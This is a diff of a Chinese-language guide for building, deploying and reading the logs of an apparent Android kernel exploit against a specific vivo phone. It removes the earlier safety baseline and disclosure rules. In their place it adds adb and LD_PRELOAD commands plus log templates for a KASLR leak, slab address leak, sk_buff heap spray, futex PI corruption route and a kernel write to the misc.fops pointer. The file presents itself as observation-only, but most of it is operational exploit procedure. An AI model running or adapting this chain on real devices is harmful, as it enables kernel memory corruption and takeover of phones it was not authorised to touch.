@@ -1,103 +1,121 @@
-# 01 — 观测、产物来源与实验安全
+# 01. 观测入口、日志采集与证据边界
 
-[English](../01-observation.md) · [项目首页](../../README.zh-CN.md)
+本文描述当前 3.1 包真实执行到的观测路径。它不是后续利用链说明，也不建议在非目标设备上尝试；这里的重点是如何采集、阅读和约束 probe 日志。
 
-## 结论先行
+当前包不附带预编译二进制、上下文副本、完整 console log、logcat、dmesg 或 tombstone。下面的片段是字段格式说明；研究结论必须由执行者在精确目标固件上重新采集。
 
-团队只有能够证明**运行了什么、在哪里运行、故障前观测到什么**，内核结论才可信。因此观测系统本身就是安全边界；它不应依赖不透明预加载对象，也不应让未经审查的产物接触开发工作站、个人手机、签名密钥或已授权 ADB 会话。
+## 入口与日志来源
 
-## 安全实验基线
+构建：
 
-- 使用可恢复出厂镜像的专用样机；不放个人数据、SIM 卡、账户、凭据，也不接生产网络。
-- 首次运行前，在法律和技术条件允许时准备精确的出厂/OTA 恢复包，确认该机型的正常重启与 Recovery 进入方式，保证电量充足，并保存设备所有者需要的解锁/恢复凭据。
-- 工作站与设备置于隔离网络，关闭不必要的外联。
-- 在一次性环境中从已审查源码构建，记录源码提交、编译器/工具链、配置与产物摘要。
-- 不运行 Issue 或群聊附件。`LD_PRELOAD` 库会在名义程序的 `main()` 之前执行，既能伪造日志，也能控制宿主进程。
-- 只采集必要日志。发布前删除序列号、boot ID、运行时绝对地址、令牌与用户数据。
-
-发生卡死或黑屏时，按根 README 引用的 vivo 官方强制重启步骤处理：当前全面屏机型同时按住电源键与音量减键 10 秒以上。强制重启只是第一恢复动作，并不能证明设备没有受损；即使出现 Recovery 菜单，也不要因为慌乱而选择清除数据或刷写选项。
-
-## 证据链
-
-每轮测试应绑定以下字段：
-
-| 字段 | 作用 |
-| --- | --- |
-| 设备/构建身份 | 防止把结论归到错误 OTA 或厂商分支 |
-| 源码提交与工作树状态 | 保证被测逻辑可审查 |
-| 工具链与配置 | 解释 ABI、CFI、检测器和布局差异 |
-| 产物 SHA-256 | 发现构建到执行之间的替换 |
-| 启动身份与单调时间 | 区分轮次，同时避免公开稳定设备标识 |
-| 预先声明的通过/失败判据 | 防止事后解释 |
-| panic/oops 证据 | 区分超时、用户态失败与内核失败 |
-
-摘要只能证明文件等同于某个已知产物，不能证明产物无害。必须先做源码审查和可复现构建。
-
-## 所给运行日志的有限解释
-
-所给日志到达 `route-summary ... route_done=1`，随后以 `u:r:shell:s0` 打印 `uid=2000(shell)`，与启动时非特权身份一致。因此它可作为本轮“观测/route 产物完成并返回，且没有提权”的正向判据；它不是 root 证据，不证明二进制普遍安全，也不证明其他构建行为。由于启动时已记录 `enforce=0`，不能把任何 SELinux 状态变化归因给本轮。
-
-目标互锁必须独立测试。设备观测元组为 PD2314/V2314A、`k6895v1_64`、`mt6895`、`arm64-v8a`、显示版本 `PD2314_A_15.2.18.0.W10`、内核 release `5.10.233-android12-9-g44ec642832da-dirty`；而产物打印的 profile 标签指向 `15.2.17.1`，所以这次正向运行不能证明精确版本拒绝。应在主动探测之前执行 fail-closed 检查，并设置负向判据：机型、board、platform、显示版本、fingerprint、内核 release、ABI 任一不符或属性不可读，都必须立即退出。
-
-### 运行日志
-
+```bash
+cd exploit
+make probe PROJECT=PD2314-AP3A.240905.015.A2 API=35
+sha256sum build/PD2314-AP3A.240905.015.A2/bin/probe.so
 ```
-[*] kernelsnitch collision-scan found=7/7 elapsed_ms=1595
-[*] kernelsnitch collision-scan leaked mm=ffffff816a8c6cc0
-[*] timing stage=page-mm-layout pid=8189 elapsed_ms=3817
-[*] tcp payload geometry slab_base=ffffff816a8c0000 payload_base=ffffff816a8c0000 payload_bias=0xe80 fake_lock=ffffff816a8c1350 fake_w0=ffffff816a8c2220 fake_task=ffffff816a8c5800 fake_fops=ffffff816a8c1000 wait_lock=ffffff816a8c1370 owner=ffffff816a8c5801
-[*] final lock mode=active-final base=ffffff816a8c1350 lock=ffffff816a8c1370 root=ffffff816a8c2220 leftmost=ffffff816a8c2220 owner=ffffff816a8c5801 fake_w0_prio=255 pi_parent=ffffff816a8c0ff8 pi_top=ffffffeb188ec200
-[*] tcp fops pi geometry parent=ffffff816a8c0ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff816a8c1370
-[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff816a8c1000
-[*] timing stage=page-leak-payload pid=8189 elapsed_ms=3818
+
+推送并复核：
+
+```bash
+adb push build/PD2314-AP3A.240905.015.A2/bin/probe.so /data/local/tmp/probe.so
+adb shell sha256sum /data/local/tmp/probe.so
+```
+
+采集建议：
+
+```bash
+adb logcat -b all -v threadtime > logcat-live.txt
+adb shell 'Z_REFCLONE=1 LD_PRELOAD=/data/local/tmp/probe.so /system/bin/toybox id' 2>&1 | tee probe-console.txt
+adb shell getprop ro.boot.bootreason
+adb shell dmesg > dmesg-after.txt
+```
+
+`probe.so` 的 `pr_*` 默认输出到 stdout；supervisor 调用 `set_unbuffer()`，所以 `tee` 能按阶段保存。logcat 不是 stdout 的替代品，它用于补充系统状态、崩溃、watchdog 或重启原因。`dmesg` 在 shell 权限下可能返回权限不足，仍建议记录返回结果。
+
+## 执行顺序
+
+1. `src/preload.c` constructor 看到 `Z_REFCLONE=1` 后打印 `probe loader starting` 并进入 `run_probe()`。
+2. `targets/.../main.c` 确认 probe 模式，进入 `refclone_load()`。
+3. supervisor 最多 fork 三次 worker，给子进程设置 `PROBE_WORKER=1`、`PROBE_ATTEMPT=N` 与当前 `LD_PRELOAD`。
+4. worker 清掉自己的 `LD_PRELOAD`，检查 fingerprint 与 kernel release。
+5. worker 设置 3 个默认参数：`PAGE_PREP_SLABS=16`、`PROCESS_VM_CONSUMER_MAX_CALLS=1`、`SLIDE_IP_ROUTE_ATTEMPTS=1`。
+6. `refclone_run_probe()` 依次执行 perf KASLR、mm/slab 定位、payload 准备与喷洒、futex/rt_mutex route、restore、`route-summary`。
+
+旧的本地裁剪构建可能把入口打印成 `preload starting`、`direct-demo supervisor` 或 `startup context`；清理后的当前包统一为 `probe loader`、`probe supervisor`、`probe context`。字段语义相同，文档以当前包为准。
+
+## 关键日志骨架
+
+```text
+[+] probe loader starting pid=...
+[*] probe supervisor attempt=1/3
+[+] probe worker starting pid=...
+[+] probe profile applied target=... defaults=3
+[+] probe context pid=... uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0
+[+] probe build pid=... label=pd2314_a_15_2_17_1_w10 route=perf-kaslr+refclone
+[*] perf probe policy paranoid=...
+[*] perf probe ring head=... tail=... records=... samples=... kernel=... lost=... malformed=...
+[*] perf probe sampled duration_ms=200 disable=0/0 min=... max=...
+[*] perf probe candidate page=... window=.../... near=... far=... buckets=...
+[+] slide-kaslr-perf-ok pid=... base=... slide=...
+[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
+[*] kernelsnitch waiters=... target=... baseline=... threshold=... margin=4 elapsed_ms=...
+[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
+[*] kernelsnitch collision-scan leaked mm=...
+[*] tcp payload geometry slab_base=... payload_bias=0xe80 fake_lock=... fake_w0=... fake_task=... fake_fops=...
+[+] final payload invariant ok mode=active-final target=... value=...
 [*] af_unix order3 staged pairs=64 requested=64
-[*] timing stage=page-spray-stage pid=8189 elapsed_ms=3819
-[*] sk_buff pcp send ret=65536 errno=0
 [*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
-[*] timing stage=page-reclaim-send pid=8189 elapsed_ms=3973
-[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
-[*] timing stage=page-cleanup pid=8189 elapsed_ms=5038
-[*] timing stage=page-total pid=8189 elapsed_ms=5039
-[*] timing stage=fops-page pid=8189 elapsed_ms=5039
-[+] refclone fops page ready base=ffffff816a8c0000
-[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
-[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x888 marker_off=0x58 target=x28+0x38 value=ffffff816a8c1370 final_fops=1 full_waiter=0 overlay=marker
-[*] slide final tree parent=ffffff8002c84ea0 right=ffffff816a8c1000 left=0 pi_write=1
-[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff816a8c1000 30=0 38=ffffff816a8c0ff8 40=0 48=0 50=ffffffeb188ec200 58=ffffff816a8c1370 60=00000000000000ff
-[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
+[*] main FUTEX_CMP_REQUEUE_PI ret=... errno=...
+[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 ...
+[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
 [*] slide ip side effect calls=1 sched_ok=1
-[*] main route chain released ret=0 errno=0 owner=0/0 safe=1
-[*] main waiter pi scrub ret=-1 errno=110 ok=1
-[*] configfs write window target=ffffffeb18a84ea8 base=ffffffeb18000000 pos=0xa884ea8 len=8 ret=8 errno=0
-[*] misc.fops restore target=ffffffeb18a84ea8 original=ffffffeb1838fbd8 ret=8 errno=0
+[*] misc.fops restore target=... original=... ret=8 errno=0
 [+] misc.fops restored to ashmem_fops — ashmem safe
-[+] route-summary pid=8189 kaslr=1 base=ffffffeb15e00000 slide=0000002b0de00000 route_done=1
-uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(addb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
+[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
+uid=2000(shell) gid=2000(shell) ...
 ```
 
+一次参考运行中，`perf probe` 出现过 `records=2047 samples=2047 kernel=2047 lost=0 malformed=0`、`window=2044/2047`，KernelSnitch 出现过 `found=7/7`，spray 出现过 `sent=4096 requested=4096`，route 阶段出现过 `sched_ok=1`。这些值说明该次运行的观测质量较高，但不能替代当前设备重新采集。
 
-复位步骤通过 configfs 写窗口将原始 `ashmem_fops` 地址写回 `misc.fops` 槽（`ret=8` = 写入 8 字节，`errno=0` = 成功）。此后设备未崩溃、未重启，ashmem 访问安全。这是对本构建复位逻辑的正向安全判据；在未独立验证 `ashmem_fops` 偏移和 configfs 写窗口可用性的情况下，不推广至其他构建。
+## 字段解释
 
-## 抗故障日志
+| 字段 | 来源 | 含义 |
+| --- | --- | --- |
+| `attr=u:r:shell:s0` | `log_startup_context()` | SELinux 上下文，只说明进程身份，不代表权限变化 |
+| `route=perf-kaslr+refclone` | `probe build` | 内部源码标签，说明选择的观测路径 |
+| `base` / `slide` | perf probe | live kernel text base 与相对 `KIMAGE_TEXT_BASE` 的偏移 |
+| `leaked mm` | KernelSnitch | 碰撞后取回的 `mm_struct` 邻近地址 |
+| `slab_base` | `leaked & ~0x7fff` | order-3 slab 页基址估计 |
+| `payload_bias=0xe80` | payload 几何 | sk_buff copy 预期落点偏移 |
+| `final payload invariant ok` | 用户态 payload 自检 | 两份 32 KiB chunk 内字段一致；不证明 kernel 已按该布局落位 |
+| `sched_ok=1` | consumer 线程 | 对 waiter tid 的 `sched_setattr` 至少成功一次 |
+| `ret=8 errno=0` | restore | 对 `dashmem_misc.fops` 目标槽位完成 8 字节写回 |
+| `route_done=1` | worker 汇总 | 线程路径到达收尾；不是独立漏洞证明 |
 
-工程实验建议使用两个互相独立的通道：
+## 证据阶梯
 
-1. 低时延主机通道，记录里程碑和时间。
-2. 直写本地记录，保留崩溃前最后一个完成状态。
+| 结论级别 | 需要同时看到 |
+| --- | --- |
+| 入口有效 | `probe loader starting`、`probe worker starting`、target profile 通过 |
+| KASLR 观测有效 | `perf probe ring` 有 kernel samples，`candidate page` 被接受，`slide-kaslr-perf-ok` 输出 |
+| slab 观测有效 | `prepare_kernel_page geom` 与 `kernelsnitch collision-scan leaked mm` 同时出现 |
+| payload 准备有效 | payload geometry 与 `final payload invariant ok` 同时出现 |
+| route 侧副作用出现 | `FUTEX_CMP_REQUEUE_PI`、`slide ip seq`、`slide ip side effect ... sched_ok=1` 同时出现 |
+| 3.1 闭环最强证据 | 上述全部成立，并且 restore `ret=8 errno=0`、`route-summary kaslr=1 route_done=1` |
 
-两者均不得写入秘密，也不得在量产环境长期开放。一次 syscall 成功返回只证明该返回条件，不证明内部内存安全；反过来，缺少一行日志也不能自动推断内核 panic，除非主机传输和用户态进程状态已由独立证据确认。
+`route-summary` 是终止标记，不是结论本体。若缺少 restore，日志只能说明执行到 route 末端附近，不能把设备状态视为已经清理。若只有 toybox `id` 输出 `uid=2000(shell)`，那只是承载进程身份，不表示权限提升。
 
-## 建议的诊断构建
+## 失败定位
 
-在拥有源码控制权时，使用独立工程内核组合启用厂商可承受的 lockdep、rtmutex 调试、KASAN、KCSAN、UBSAN 和故障注入。检测器会改变时序与性能，不应放入量产设备。
+| 症状 | 可能位置 | 处理方式 |
+| --- | --- | --- |
+| fingerprint/kernel mismatch | 目标门禁 | 停止，不要强行改常量跑其他固件 |
+| `perf probe open errno` | perf 权限或策略 | 记录 `paranoid`、`attr_size`、errno；该次不能进入 KASLR 证据 |
+| `no usable kernel samples` | perf 样本质量 | 可小范围调整 `PERF_PROBE_MSEC` 后重测 |
+| `rejected histogram` | base 候选不集中 | 保存 ring 统计，避免手工指定 live base |
+| `only found ... collisions` | KernelSnitch 碰撞不足 | supervisor retry 会把 `PAGE_PREP_SLABS` 提到 32 |
+| spray `sent` 小于 `requested` | AF_UNIX/sk_buff 压力不足 | 记录首个失败 `ret/errno`，不要把后续阶段视为有效 |
+| restore `ret != 8` | 写回闭环失败 | 保存 stdout/logcat/dmesg，准备设备重启恢复 |
+| 卡死或自动重启 | kernel panic/watchdog | 长按音量下 + 电源键恢复，再采 `bootreason` 与可用的 `dmesg` |
 
-断言应围绕不变量，而非攻击者几何：
-
-- 任务从 PI 等待路径返回后，除非仍真实阻塞，否则 `pi_blocked_on == NULL`。
-- 修改哪个任务的 PI 字段，就必须持有哪个任务的 `pi_lock`。
-- waiter 从两棵 RB 树删除后，不再能从 `rb_leftmost` 到达。
-- 早期错误清理只依赖该时刻保证已初始化的 waiter 字段。
-
-## 公开规则
-
-可公开源码片段、最小化轨迹、符号偏移和验证矩阵；不要公开实时设备地址、不透明 payload、预编译 preload 库，或把生命周期缺陷转化为权限修改原语的操作序列。
+任何重启、panic、watchdog 或长时间无响应都属于测试风险；执行者自行承担。合法拥有者在精确目标上测试时，当前包不做持久化或驻留，通常不应造成永久性损伤，但仍应提前备份重要数据。
